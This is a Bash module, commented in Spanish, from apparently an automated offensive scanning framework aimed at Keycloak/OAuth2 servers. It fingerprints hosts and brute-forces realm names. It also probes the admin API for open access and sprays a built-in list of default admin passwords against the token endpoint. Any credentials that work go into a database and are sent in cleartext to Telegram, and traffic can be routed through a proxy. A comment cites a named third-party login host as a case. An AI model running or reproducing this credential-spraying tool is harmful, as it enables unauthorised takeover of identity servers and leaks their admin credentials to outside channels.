#!/usr/bin/env bash
# ============================================================
#  modules/31_keycloak_enum.sh
#  Fase 31: Keycloak / OAuth2 server enumeration
#
#  Técnicas:
#    - Detección por endpoint /auth/realms/master (JSON signature)
#    - Enumeración de realms: master + dominio + tenants
#    - Admin API access check: /auth/admin/realms (401 vs 403 vs 200)
#    - Default credential spray en admin-cli (password grant)
#    - Open registration check (realm.registrationAllowed)
#    - Realm brute-force vía user registration 404 vs 200
#    - OIDC config exposure: /.well-known/openid-configuration
#    - User enumeration vía forgot-password si está habilitado
#
#  Referencias:
#    - Keycloak Security Advisory (default admin credentials)
#    - PortSwigger OAuth2 misconfiguration research
#    - guru.dcu.ie case — login.gurudevelopments.com (2026-05-03)
# ============================================================

MODULE_NAME="keycloak_enum"
MODULE_DESC="Keycloak / OAuth2 server enumeration"

# ── Credenciales default a probar en admin-cli ────────────────
_KC_DEFAULT_CREDS=(
  "admin:admin"
  "admin:password"
  "admin:Password1"
  "admin:keycloak"
  "admin:admin123"
  "keycloak:keycloak"
  "admin:changeme"
  "administrator:administrator"
  "admin:secret"
  "root:root"
)

# ── Fingerprint: ¿es Keycloak? ────────────────────────────────
_is_keycloak() {
  local HOST="$1"   # https://login.example.com

  # Prueba el endpoint canónico de realm
  local BODY STATUS
  BODY=$(curl -s --max-time 8 \
    -H "Accept: application/json" \
    -w "\n###STATUS###%{http_code}" \
    "${HOST}/auth/realms/master" 2>/dev/null)
  STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
  BODY=$(echo "$BODY" | grep -v '###STATUS###')

  if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi "token-service\|public_key\|\"realm\""; then
    echo "$BODY"
    return 0
  fi

  # Keycloak 17+ sin /auth prefix
  BODY=$(curl -s --max-time 8 \
    -H "Accept: application/json" \
    -w "\n###STATUS###%{http_code}" \
    "${HOST}/realms/master" 2>/dev/null)
  STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
  BODY=$(echo "$BODY" | grep -v '###STATUS###')

  if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi "token-service\|public_key\|\"realm\""; then
    echo "NOPREFIX:$BODY"
    return 0
  fi

  return 1
}

# ── Construir base URL correcta (con o sin /auth prefix) ──────
_kc_base() {
  local HOST="$1"
  local FINGERPRINT="$2"

  if echo "$FINGERPRINT" | grep -q "^NOPREFIX:"; then
    echo "${HOST}/realms"
  else
    echo "${HOST}/auth/realms"
  fi
}

_kc_admin_base() {
  local HOST="$1"
  local FINGERPRINT="$2"

  if echo "$FINGERPRINT" | grep -q "^NOPREFIX:"; then
    echo "${HOST}/admin/realms"
  else
    echo "${HOST}/auth/admin/realms"
  fi
}

# ── Enumerar realms ───────────────────────────────────────────
_enum_realms() {
  local HOST="$1"
  local DOMAIN="$2"
  local BASE="$3"   # https://host/auth/realms
  local PROXY_FLAG="$4"

  # Candidatos: master + partes del dominio + nombres comunes
  local ROOT_DOMAIN
  ROOT_DOMAIN=$(echo "$DOMAIN" | rev | cut -d. -f1-2 | rev)
  local DOMAIN_PARTS
  DOMAIN_PARTS=$(echo "$DOMAIN" | tr '.' '\n' | head -3)

  local REALM_CANDS=(
    master
    $(echo "$DOMAIN_PARTS")
    "${ROOT_DOMAIN%%.*}"
    app
    api
    internal
    external
    prod
    staging
    dev
    users
    employees
    customers
  )

  local FOUND_REALMS=()
  for REALM in "${REALM_CANDS[@]}"; do
    [[ -z "$REALM" ]] && continue
    local STATUS BODY
    BODY=$(curl -s --max-time 8 ${PROXY_FLAG} \
      -H "Accept: application/json" \
      -w "\n###STATUS###%{http_code}" \
      "${BASE}/${REALM}" 2>/dev/null)
    STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
    BODY=$(echo "$BODY" | grep -v '###STATUS###')

    if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi '"realm"'; then
      FOUND_REALMS+=("$REALM")
      # Comprobar si registration está abierta
      if echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    print('open' if d.get('registrationAllowed') else 'closed')
except Exception:
    print('unknown')
" 2>/dev/null | grep -q "open"; then
        log_warn "    ⚡ Realm '$REALM': registro abierto (registrationAllowed=true)"
      fi
    fi
  done

  echo "${FOUND_REALMS[@]}"
}

# ── Probar credenciales default en admin-cli ─────────────────
_spray_admin_creds() {
  local HOST="$1"
  local BASE="$2"       # https://host/auth/realms
  local ADMIN_BASE="$3" # https://host/auth/admin/realms
  local DOMAIN_ID="$4"
  local DOMAIN="$5"
  local PROXY_FLAG="$6"

  local TOKEN_URL="${BASE}/master/protocol/openid-connect/token"

  for CRED in "${_KC_DEFAULT_CREDS[@]}"; do
    local KC_USER="${CRED%%:*}"
    local KC_PASS="${CRED##*:}"

    local RESP STATUS TOKEN
    RESP=$(curl -s --max-time 10 ${PROXY_FLAG} \
      -X POST \
      -d "client_id=admin-cli&grant_type=password&username=${KC_USER}&password=${KC_PASS}" \
      -w "\n###STATUS###%{http_code}" \
      "$TOKEN_URL" 2>/dev/null)
    STATUS=$(echo "$RESP" | grep -oP '(?<=###STATUS###)\d+')
    local RESP_BODY
    RESP_BODY=$(echo "$RESP" | grep -v '###STATUS###')

    if [[ "$STATUS" == "200" ]]; then
      TOKEN=$(echo "$RESP_BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    print(d.get('access_token',''))
except Exception:
    pass
" 2>/dev/null)

      log_warn "  ⚡ Keycloak admin-cli: credenciales válidas $KC_USER:$KC_PASS"

      # Verificar acceso al admin API con el token
      local ADMIN_STATUS
      ADMIN_STATUS=$(curl -s --max-time 10 ${PROXY_FLAG} \
        -H "Authorization: Bearer $TOKEN" \
        -o /dev/null -w "%{http_code}" \
        "$ADMIN_BASE" 2>/dev/null)

      local SEVERITY="high"
      local DETAIL="admin-cli password grant exitoso con credencial default: ${KC_USER}:${KC_PASS}"
      [[ "$ADMIN_STATUS" == "200" ]] && SEVERITY="critical" && \
        DETAIL+=" | Admin API accesible (HTTP 200) — acceso completo a todos los realms"

      db_add_finding "$DOMAIN_ID" "keycloak_default_creds" "$SEVERITY" \
        "$HOST" "keycloak_admin_creds" "$DETAIL"

      _telegram_send "🔓 *Keycloak credenciales default válidas*
🌐 \`${DOMAIN}\`
🔗 \`${HOST}\`
📋 Severidad: \`${SEVERITY^^}\`
👤 Credencial: \`${KC_USER}:${KC_PASS}\`
🏛️ Admin API: HTTP ${ADMIN_STATUS}
💡 ${DETAIL}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

      return 0
    fi
  done
  return 1
}

# ── Verificar admin API (sin credenciales) ────────────────────
_check_admin_api() {
  local ADMIN_BASE="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local HOST="$4"
  local PROXY_FLAG="$5"

  local STATUS
  STATUS=$(curl -s --max-time 8 ${PROXY_FLAG} \
    -H "Accept: application/json" \
    -o /dev/null -w "%{http_code}" \
    "$ADMIN_BASE" 2>/dev/null)

  if [[ "$STATUS" == "200" ]]; then
    log_warn "  ⚡ Keycloak Admin API sin autenticación: $ADMIN_BASE"
    db_add_finding "$DOMAIN_ID" "keycloak_admin_unauth" "critical" \
      "$ADMIN_BASE" "keycloak_admin_open" \
      "Admin API accesible sin autenticación — acceso completo a realm management"
    _telegram_send "🚨 *Keycloak Admin API sin auth*
🌐 \`${DOMAIN}\`
🔗 \`${ADMIN_BASE}\`
⚠️ Admin API completamente abierta — CRITICAL
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    return 0
  fi

  # 401 = necesita auth (normal), 403 = auth OK pero permisos; ambos son informativos
  log_info "  [keycloak] Admin API: HTTP $STATUS (esperado 401) — $ADMIN_BASE"
  return 1
}

# ── OIDC config check ─────────────────────────────────────────
_check_oidc_config() {
  local HOST="$1"
  local BASE="$2"
  local DOMAIN_ID="$3"
  local DOMAIN="$4"
  local PROXY_FLAG="$5"
  local FOUND_REALMS=("${@:6}")

  # Well-known OIDC para cada realm encontrado
  for REALM in master "${FOUND_REALMS[@]}"; do
    [[ -z "$REALM" ]] && continue
    local OIDC_URL="${BASE}/${REALM}/.well-known/openid-configuration"
    local STATUS BODY
    BODY=$(curl -s --max-time 8 ${PROXY_FLAG} \
      -w "\n###STATUS###%{http_code}" \
      "$OIDC_URL" 2>/dev/null)
    STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
    BODY=$(echo "$BODY" | grep -v '###STATUS###')

    if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qi "authorization_endpoint\|token_endpoint"; then
      local ISSUER
      ISSUER=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    print(d.get('issuer','?'))
except Exception:
    print('?')
" 2>/dev/null)
      log_info "  [keycloak] OIDC config: $OIDC_URL (issuer: $ISSUER)"

      # Extraer grant types y scopes para reconocimiento
      local GRANTS
      GRANTS=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    print(' '.join(d.get('grant_types_supported',[])))
except Exception:
    pass
" 2>/dev/null)

      db_add_finding "$DOMAIN_ID" "keycloak_oidc_exposed" "info" \
        "$OIDC_URL" "oidc_config" \
        "OIDC config pública: issuer=${ISSUER} | grants=${GRANTS}"
    fi
  done
}

# ── Escanear un host Keycloak ─────────────────────────────────
_scan_keycloak() {
  local HOST="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"

  log_info "  [keycloak] Probando: $HOST"

  local FP
  FP=$(_is_keycloak "$HOST")
  [[ $? -ne 0 ]] && return

  local BASE ADMIN_BASE
  BASE=$(_kc_base "$HOST" "$FP")
  ADMIN_BASE=$(_kc_admin_base "$HOST" "$FP")

  log_warn "  ⚙️  Keycloak detectado: $HOST (base: $BASE)"

  # Extraer versión si disponible
  local KC_VERSION
  KC_VERSION=$(echo "$FP" | python3 -c "
import sys, json
try:
    raw = sys.stdin.read().lstrip('NOPREFIX:')
    d = json.loads(raw)
    print(d.get('keycloak-version', d.get('version', '?')))
except Exception:
    print('?')
" 2>/dev/null)
  [[ "$KC_VERSION" != "?" ]] && log_info "  [keycloak] Versión: $KC_VERSION"

  # 1. Enumerar realms
  local REALMS_STR
  REALMS_STR=$(_enum_realms "$HOST" "$DOMAIN" "$BASE" "$PROXY_FLAG")
  read -ra FOUND_REALMS <<< "$REALMS_STR"
  log_info "  [keycloak] Realms encontrados: ${FOUND_REALMS[*]:-master}"

  # Registrar hallazgo base (host Keycloak expuesto)
  local BEFORE
  BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND target='${HOST//\'/\'\'}' AND type='keycloak_exposed';" \
    2>/dev/null || echo "1")

  if [[ "${BEFORE:-1}" == "0" ]]; then
    db_add_finding "$DOMAIN_ID" "keycloak_exposed" "info" \
      "$HOST" "keycloak_fingerprint" \
      "Keycloak detectado | versión: ${KC_VERSION} | realms: ${FOUND_REALMS[*]:-master}"
    _telegram_send "🔑 *Keycloak detectado*
🌐 \`${DOMAIN}\`
🔗 \`${HOST}\`
📦 Versión: \`${KC_VERSION}\`
🏛️ Realms: \`${FOUND_REALMS[*]:-master}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  # 2. Admin API sin credenciales
  _check_admin_api "$ADMIN_BASE" "$DOMAIN_ID" "$DOMAIN" "$HOST" "$PROXY_FLAG"

  # 3. Credenciales default en admin-cli
  _spray_admin_creds "$HOST" "$BASE" "$ADMIN_BASE" "$DOMAIN_ID" "$DOMAIN" "$PROXY_FLAG"

  # 4. OIDC config para todos los realms
  _check_oidc_config "$HOST" "$BASE" "$DOMAIN_ID" "$DOMAIN" "$PROXY_FLAG" "${FOUND_REALMS[@]}"
}

# ── Encontrar candidatos Keycloak ─────────────────────────────
_find_keycloak_candidates() {
  local DOMAIN_ID="$1"
  local DOMAIN="$2"
  local OUT_DIR="$3"

  local CANDS="$OUT_DIR/.kc_cands.txt"
  > "$CANDS"

  # 1. Subdominios con prefijos típicos de auth/SSO
  if [[ -s "$OUT_DIR/subs_alive.txt" ]]; then
    grep -iE "^(login|auth|sso|idp|identity|keycloak|oauth|iam|sts|accounts)\." \
      "$OUT_DIR/subs_alive.txt" 2>/dev/null \
      | sed 's|^|https://|' >> "$CANDS" || true
  fi

  # 2. URLs de la DB con /auth/realms/ ya descubiertas
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT 'https://' || replace(replace(url,'https://',''),'http://','')
     FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (url LIKE '%/auth/realms/%' OR url LIKE '%/realms/master%'
            OR url LIKE '%/openid-connect/%' OR url LIKE '%.well-known/openid-configuration%');" \
    2>/dev/null \
    | sed 's|/auth/realms.*||;s|/realms.*||;s|\.well-known.*||;s|/openid-connect.*||' \
    >> "$CANDS"

  # 3. Login forms tipificadas como oauth en la DB
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT 'https://' || replace(replace(url,'https://',''),'http://','')
     FROM login_forms
     WHERE domain_id=${DOMAIN_ID} AND login_type='oauth';" \
    2>/dev/null \
    | sed 's|/auth/.*||;s|/realms/.*||' \
    >> "$CANDS"

  sort -u "$CANDS" -o "$CANDS"
  echo "$CANDS"
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 31 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local CANDS_FILE
  CANDS_FILE=$(_find_keycloak_candidates "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR")

  local TOTAL
  TOTAL=$(wc -l < "$CANDS_FILE" | tr -d ' ')

  if [[ "$TOTAL" -eq 0 ]]; then
    log_info "Sin candidatos para Keycloak enum"
    rm -f "$CANDS_FILE"
    return
  fi

  log_info "Probando $TOTAL candidatos como Keycloak/OAuth server..."

  local PIDS=()
  while IFS= read -r HOST; do
    [[ -z "$HOST" ]] && continue
    (
      _scan_keycloak "$HOST" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    ) &
    PIDS+=($!)
    if [[ ${#PIDS[@]} -ge 5 ]]; then
      wait "${PIDS[0]}" 2>/dev/null || true
      PIDS=("${PIDS[@]:1}")
    fi
  done < "$CANDS_FILE"
  wait "${PIDS[@]}" 2>/dev/null || true

  rm -f "$CANDS_FILE"

  local FOUND
  FOUND=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID}
       AND type IN ('keycloak_exposed','keycloak_default_creds','keycloak_admin_unauth');" \
    2>/dev/null || echo 0)
  log_ok "$MODULE_DESC completado: $FOUND Keycloak findings"
}
